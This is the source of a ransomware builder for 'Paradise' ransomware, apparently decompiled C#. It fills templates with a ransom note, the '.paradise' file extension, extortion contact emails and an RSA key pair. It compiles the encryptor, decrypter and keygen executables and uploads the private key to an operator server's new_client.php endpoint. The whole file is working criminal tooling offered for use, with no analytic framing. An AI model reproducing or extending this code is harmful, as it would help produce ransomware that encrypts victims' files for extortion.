
using DP_Builder.Properties;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace DP_Builder
{
  public class MainForm : Form
  {
    private string RSA_Public = "";
    private string RSA_Private = "";
    private string server = "";
    private string adminkey = "";
    private string img = "";
    private string text = "";
    private IContainer components = (IContainer) null;
    private Panel panel1;
    private TextBox vectorTB;
    private Button genBtn;
    private TextBox emailTB;
    private Button textBtn;
    private Button createBtn;
    private Panel panel2;
    private Button saveBtn;
    private TextBox admKeyTB;
    private Label label2;
    private Label label1;
    private TextBox siteTB;
    private TextBox utextTB;
    private CheckBox useDT;
    private TextBox contactTB;
    private TextBox email2TB;
    private TextBox puthTB;
    private Label label3;
    private TextBox extTB;

    public MainForm()
    {
      this.InitializeComponent();
    }

    private void createBtn_Click(object sender, EventArgs e)
    {
      if (this.extTB.Text[0] != '.')
        this.extTB.Text = "." + this.extTB.Text;
      this.text = this.utextTB.Text;
      this.text = this.text.Replace("\r\n", "<br>");
      string contents = (int.Parse(System.IO.File.ReadAllText("DP.last")) + 1).ToString();
      System.IO.File.WriteAllText("DP.last", contents);
      Directory.CreateDirectory(contents + " build " + this.vectorTB.Text + " [" + this.emailTB.Text + "]");
      string str = Directory.GetCurrentDirectory() + "/" + contents + " build " + this.vectorTB.Text + " [" + this.emailTB.Text + "]".Replace("\\", "/");
      string text1 = Resources.res.Replace("%TEXT_FOR_UNLOCK%", this.text).Replace("%EXTENSION%", this.extTB.Text).Replace("%FIRST_MAIL%", this.emailTB.Text).Replace("%SECOND_MAIL%", this.email2TB.Text).Replace("%INC_VECTOR%", this.vectorTB.Text).Replace("%RSA_PUBLIC%", this.RSA_Public).Replace("%SERVER%", this.server).Replace("%STFU%", this.useDT.Checked.ToString());
      string text2 = Resources.DP_Decrypter.Replace("%VECTOR%", this.vectorTB.Text).Replace("%EXTENSION%", this.extTB.Text).Replace("%SERVER%", this.server);
      string text3 = Resources.DP_Keygen.Replace("%VECTOR%", this.vectorTB.Text).Replace("%SERVER%", this.server).Replace("%EMAIL%", this.emailTB.Text);
      List<string> libs = new List<string>();
      libs.Add("System.dll");
      libs.Add("System.Windows.Forms.dll");
      libs.Add("System.Drawing.dll");
      this.MakeBuild(str + "/DP_Main.exe", libs, text1, "v3.5");
      this.MakeBuild(str + "/DP_Decrypter.exe", libs, text2, "v4.0");
      this.MakeBuild(str + "/DP_Keygen.exe", libs, text3, "v4.0");
      if (this.server != "localhost")
        this.AddLicense();
      System.IO.File.WriteAllText(str + "/ExtraKey.dp", this.RSA_Private);
      this.GetRSAKeys();
      this.vectorTB.Text = new Regex("<Modulus>(.*)</Modulus>", RegexOptions.IgnoreCase).Match(this.RSA_Public).Groups[1].Value.Substring(0, 8).Replace("\\", "0").Replace("/", "0");
      this.Text = "DP_Builder[#" + contents + " created]";
    }

    private void MakeBuild(string puth, List<string> libs, string text, string param)
    {
      List<string> stringList = new List<string>();
      stringList.Add(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Microsoft.NET\\Framework\\v2.0.50727\\mscorlib.dll"));
      CompilerResults compilerResults;
      using (CSharpCodeProvider csharpCodeProvider = new CSharpCodeProvider((IDictionary<string, string>) new Dictionary<string, string>()
      {
        {
          "CompilerVersion",
          param
        }
      }))
      {
        CompilerParameters compilerParameters = new CompilerParameters();
        CompilerParameters options;
        if (param == "v3.5")
        {
          options = new CompilerParameters(stringList.ToArray(), puth);
          options.GenerateExecutable = true;
          options.CompilerOptions = "/nostdlib";
        }
        else
          options = new CompilerParameters()
          {
            OutputAssembly = puth,
            GenerateExecutable = true,
            CompilerOptions = "/t:winexe"
          };
        foreach (string lib in libs)
          options.ReferencedAssemblies.Add(lib);
        compilerResults = csharpCodeProvider.CompileAssemblyFromSource(options, text);
      }
      if (compilerResults.Errors.Count == 0)
        this.Text = "DP_Builder[" + Path.GetFileName(puth) + " compilated]";
      foreach (CompilerError error in (CollectionBase) compilerResults.Errors)
      {
        int num = (int) MessageBox.Show(string.Format("Ошибка: {0}", (object) error.ErrorText));
      }
    }

    private void genBtn_Click(object sender, EventArgs e)
    {
      this.GetRSAKeys();
      this.vectorTB.Text = new Regex("<Modulus>(.*)</Modulus>", RegexOptions.IgnoreCase).Match(this.RSA_Public).Groups[1].Value.Substring(0, 8).Replace("\\", "0").Replace("/", "0").Replace("+", "0");
    }

    private void MainForm_Load(object sender, EventArgs e)
    {
      Resources.image_2.Save("img.png");
      this.img = Convert.ToBase64String(System.IO.File.ReadAllBytes("img.png"));
      System.IO.File.Delete("img.png");
      this.GetRSAKeys();
      this.vectorTB.Text = new Regex("<Modulus>(.*)</Modulus>", RegexOptions.IgnoreCase).Match(this.RSA_Public).Groups[1].Value.Substring(0, 8).Replace("\\", "0").Replace("/", "0");
      if (System.IO.File.Exists("Server.info"))
      {
        string[] strArray = System.IO.File.ReadAllLines("Server.info");
        this.server = strArray[0];
        this.adminkey = strArray[1];
        this.Height = 285;
      }
      else
      {
        this.createBtn.Enabled = false;
        this.Height = 407;
      }
    }

    private void textBtn_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.Filter = "Txt files|*.html";
      if (openFileDialog.ShowDialog() != DialogResult.OK)
        return;
      this.utextTB.Text = System.IO.File.ReadAllText(openFileDialog.FileName);
      this.puthTB.Text = openFileDialog.FileName;
    }

    private void GetRSAKeys()
    {
      RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider();
      this.RSA_Private = cryptoServiceProvider.ToXmlString(true);
      this.RSA_Public = cryptoServiceProvider.ToXmlString(false);
    }

    private void AddLicense()
    {
      string address = this.server + "/" + this.adminkey + "/new_client.php";
      using (WebClient webClient = new WebClient())
      {
        if (Encoding.UTF8.GetString(webClient.UploadValues(address, new NameValueCollection()
        {
          {
            "vector",
            this.vectorTB.Text
          },
          {
            "email",
            this.emailTB.Text
          },
          {
            "master",
            Convert.ToBase64String(Encoding.Default.GetBytes(this.RSA_Private))
          },
          {
            "contact",
            this.contactTB.Text
          }
        })) == "Successful")
          this.Text = "DP_Builder[License created]";
        else
          this.Text = "DP_Builder[License creation error]";
      }
    }

    private void saveBtn_Click(object sender, EventArgs e)
    {
      this.server = this.siteTB.Text;
      this.adminkey = this.admKeyTB.Text;
      System.IO.File.WriteAllText("Server.info", this.siteTB.Text + "\r\n" + this.admKeyTB.Text);
      this.createBtn.Enabled = true;
      this.Height = 285;
    }

    private void contactTB_Click(object sender, EventArgs e)
    {
      if (!(this.contactTB.Text == "Contact"))
        return;
      this.contactTB.Text = "";
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.panel1 = new Panel();
      this.email2TB = new TextBox();
      this.contactTB = new TextBox();
      this.useDT = new CheckBox();
      this.utextTB = new TextBox();
      this.textBtn = new Button();
      this.emailTB = new TextBox();
      this.vectorTB = new TextBox();
      this.genBtn = new Button();
      this.createBtn = new Button();
      this.panel2 = new Panel();
      this.saveBtn = new Button();
      this.admKeyTB = new TextBox();
      this.label2 = new Label();
      this.label1 = new Label();
      this.siteTB = new TextBox();
      this.extTB = new TextBox();
      this.label3 = new Label();
      this.puthTB = new TextBox();
      this.panel1.SuspendLayout();
      this.panel2.SuspendLayout();
      this.SuspendLayout();
      this.panel1.BorderStyle = BorderStyle.FixedSingle;
      this.panel1.Controls.Add((Control) this.puthTB);
      this.panel1.Controls.Add((Control) this.label3);
      this.panel1.Controls.Add((Control) this.extTB);
      this.panel1.Controls.Add((Control) this.email2TB);
      this.panel1.Controls.Add((Control) this.contactTB);
      this.panel1.Controls.Add((Control) this.useDT);
      this.panel1.Controls.Add((Control) this.utextTB);
      this.panel1.Controls.Add((Control) this.textBtn);
      this.panel1.Controls.Add((Control) this.emailTB);
      this.panel1.Controls.Add((Control) this.vectorTB);
      this.panel1.Controls.Add((Control) this.genBtn);
      this.panel1.Location = new Point(12, 12);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(490, 195);
      this.panel1.TabIndex = 2;
      this.email2TB.Location = new Point(333, 4);
      this.email2TB.Name = "email2TB";
      this.email2TB.Size = new Size(151, 20);
      this.email2TB.TabIndex = 12;
      this.email2TB.Text = "paradise@all-ransomware.info";
      this.email2TB.TextAlign = HorizontalAlignment.Center;
      this.contactTB.Location = new Point(3, 26);
      this.contactTB.Name = "contactTB";
      this.contactTB.Size = new Size(234, 20);
      this.contactTB.TabIndex = 11;
      this.contactTB.Text = "Contact";
      this.contactTB.TextAlign = HorizontalAlignment.Center;
      this.contactTB.Click += new EventHandler(this.contactTB_Click);
      this.useDT.AutoSize = true;
      this.useDT.Checked = true;
      this.useDT.CheckState = CheckState.Checked;
      this.useDT.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.useDT.Location = new Point(5, 52);
      this.useDT.Name = "useDT";
      this.useDT.Size = new Size(160, 17);
      this.useDT.TabIndex = 10;
      this.useDT.Text = "Use \"DECRYPT MY FILES\"";
      this.useDT.UseVisualStyleBackColor = true;
      this.utextTB.Location = new Point(5, 73);
      this.utextTB.Multiline = true;
      this.utextTB.Name = "utextTB";
      this.utextTB.Size = new Size(479, 117);
      this.utextTB.TabIndex = 9;
      this.textBtn.Location = new Point(434, 49);
      this.textBtn.Name = "textBtn";
      this.textBtn.Size = new Size(50, 23);
      this.textBtn.TabIndex = 7;
      this.textBtn.Text = "...";
      this.textBtn.UseVisualStyleBackColor = true;
      this.textBtn.Click += new EventHandler(this.textBtn_Click);
      this.emailTB.Location = new Point(179, 4);
      this.emailTB.Name = "emailTB";
      this.emailTB.Size = new Size(151, 20);
      this.emailTB.TabIndex = 4;
      this.emailTB.Text = "info@all-ransomware.info";
      this.emailTB.TextAlign = HorizontalAlignment.Center;
      this.vectorTB.Location = new Point(3, 4);
      this.vectorTB.Name = "vectorTB";
      this.vectorTB.Size = new Size(93, 20);
      this.vectorTB.TabIndex = 3;
      this.vectorTB.Text = "Vector";
      this.vectorTB.TextAlign = HorizontalAlignment.Center;
      this.genBtn.Location = new Point(98, 3);
      this.genBtn.Name = "genBtn";
      this.genBtn.Size = new Size(75, 23);
      this.genBtn.TabIndex = 2;
      this.genBtn.Text = "Generate";
      this.genBtn.UseVisualStyleBackColor = true;
      this.genBtn.Click += new EventHandler(this.genBtn_Click);
      this.createBtn.Location = new Point(12, 213);
      this.createBtn.Name = "createBtn";
      this.createBtn.Size = new Size(490, 23);
      this.createBtn.TabIndex = 3;
      this.createBtn.Text = "Create build";
      this.createBtn.UseVisualStyleBackColor = true;
      this.createBtn.Click += new EventHandler(this.createBtn_Click);
      this.panel2.BorderStyle = BorderStyle.Fixed3D;
      this.panel2.Controls.Add((Control) this.saveBtn);
      this.panel2.Controls.Add((Control) this.admKeyTB);
      this.panel2.Controls.Add((Control) this.label2);
      this.panel2.Controls.Add((Control) this.label1);
      this.panel2.Controls.Add((Control) this.siteTB);
      this.panel2.Location = new Point(12, 246);
      this.panel2.Name = "panel2";
      this.panel2.Size = new Size(490, 113);
      this.panel2.TabIndex = 4;
      this.saveBtn.Location = new Point(4, 82);
      this.saveBtn.Name = "saveBtn";
      this.saveBtn.Size = new Size(479, 23);
      this.saveBtn.TabIndex = 4;
      this.saveBtn.Text = "Save";
      this.saveBtn.UseVisualStyleBackColor = true;
      this.saveBtn.Click += new EventHandler(this.saveBtn_Click);
      this.admKeyTB.Location = new Point(4, 59);
      this.admKeyTB.Name = "admKeyTB";
      this.admKeyTB.Size = new Size(479, 20);
      this.admKeyTB.TabIndex = 3;
      this.label2.AutoSize = true;
      this.label2.Location = new Point(226, 43);
      this.label2.Name = "label2";
      this.label2.Size = new Size(59, 13);
      this.label2.TabIndex = 2;
      this.label2.Text = "Admin key:";
      this.label1.AutoSize = true;
      this.label1.Location = new Point(240, 4);
      this.label1.Name = "label1";
      this.label1.Size = new Size(28, 13);
      this.label1.TabIndex = 1;
      this.label1.Text = "Site:";
      this.siteTB.Location = new Point(4, 20);
      this.siteTB.Name = "siteTB";
      this.siteTB.Size = new Size(479, 20);
      this.siteTB.TabIndex = 0;
      this.extTB.Font = new Font("Courier New", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.extTB.Location = new Point(352, 26);
      this.extTB.Name = "extTB";
      this.extTB.Size = new Size(131, 22);
      this.extTB.TabIndex = 13;
      this.extTB.Text = ".paradise";
      this.extTB.TextAlign = HorizontalAlignment.Center;
      this.label3.AutoSize = true;
      this.label3.Location = new Point(273, 30);
      this.label3.Name = "label3";
      this.label3.Size = new Size(73, 13);
      this.label3.TabIndex = 14;
      this.label3.Text = "Расширение:";
      this.puthTB.Location = new Point(171, 51);
      this.puthTB.Name = "puthTB";
      this.puthTB.ReadOnly = true;
      this.puthTB.Size = new Size(257, 20);
      this.puthTB.TabIndex = 15;
      this.puthTB.Text = "...";
      this.puthTB.TextAlign = HorizontalAlignment.Center;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(511, 368);
      this.Controls.Add((Control) this.panel2);
      this.Controls.Add((Control) this.createBtn);
      this.Controls.Add((Control) this.panel1);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.MaximizeBox = false;
      this.Name = nameof (MainForm);
      this.Text = "DP_Builder";
      this.Load += new EventHandler(this.MainForm_Load);
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();
      this.panel2.ResumeLayout(false);
      this.panel2.PerformLayout();
      this.ResumeLayout(false);
    }
  }
}
